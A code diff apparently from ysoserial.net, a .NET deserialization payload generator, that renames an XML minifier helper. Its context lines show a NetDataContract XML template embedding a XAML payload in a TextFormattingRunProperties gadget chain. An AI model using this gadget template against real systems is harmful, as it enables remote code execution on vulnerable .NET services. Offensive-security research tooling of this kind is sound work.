@@ -114,7 +114,7 @@ namespace ysoserial.Generators
 
                     if (inputArgs.Minify)
                     {
-                        xaml_payload = XmlMinifier.Minify(xaml_payload, null, null);
+                        xaml_payload = XmlHelper.Minify(xaml_payload, null, null);
                     }
 
                     xaml_payload = CommandArgSplitter.JsonStringEscape(xaml_payload);
@@ -304,7 +304,7 @@ namespace ysoserial.Generators
 
                     if (inputArgs.Minify)
                     {
-                        xaml_payload = XmlMinifier.Minify(xaml_payload, null, null);
+                        xaml_payload = XmlHelper.Minify(xaml_payload, null, null);
                     }
 
                     ndcPayload = @"<w b:Type=""System.Resources.ResourceSet"" b:Assembly=""0"" xmlns=""http://schemas.datacontract.org/2004/07/System.Resources"" xmlns:a=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:b=""http://schemas.microsoft.com/2003/10/Serialization/""><Table b:Type=""System.Collections.Hashtable"" b:Assembly=""0"" xmlns:c=""http://schemas.microsoft.com/2003/10/Serialization/Arrays""><LoadFactor b:Type=""System.Single"" b:Assembly=""0"" xmlns="""">0</LoadFactor><Version b:Type=""System.Int32"" b:Assembly=""0"" xmlns="""">1</Version><HashSize b:Type=""System.Int32"" b:Assembly=""0"" xmlns="""">3</HashSize><Values b:Type=""System.Object[]"" b:Assembly=""0"" b:Size=""1"" xmlns=""""><c:anyType b:Type=""Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties"" b:Assembly=""Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35""><ForegroundBrush b:Type=""System.String"" b:Assembly=""0""><![CDATA[" + xaml_payload + @"]]></ForegroundBrush></c:anyType></Values></Table></w>";
@@ -315,11 +315,11 @@ namespace ysoserial.Generators
                 {
                     if (inputArgs.UseSimpleType)
                     {
-                        ndcPayload = XmlMinifier.Minify(ndcPayload, new string[] { "mscorlib", "Microsoft.PowerShell.Editor" }, new string[] { "</Values></Table></w>" }, FormatterType.NetDataContractXML, true);
+                        ndcPayload = XmlHelper.Minify(ndcPayload, new string[] { "mscorlib", "Microsoft.PowerShell.Editor" }, new string[] { "</Values></Table></w>" }, FormatterType.NetDataContractXML, true);
                     }
                     else
                     {
-                        ndcPayload = XmlMinifier.Minify(ndcPayload, null, new string[] { "</Values></Table></w>" }, FormatterType.NetDataContractXML, true);
+                        ndcPayload = XmlHelper.Minify(ndcPayload, null, new string[] { "</Values></Table></w>" }, FormatterType.NetDataContractXML, true);
                     }
                 }
 
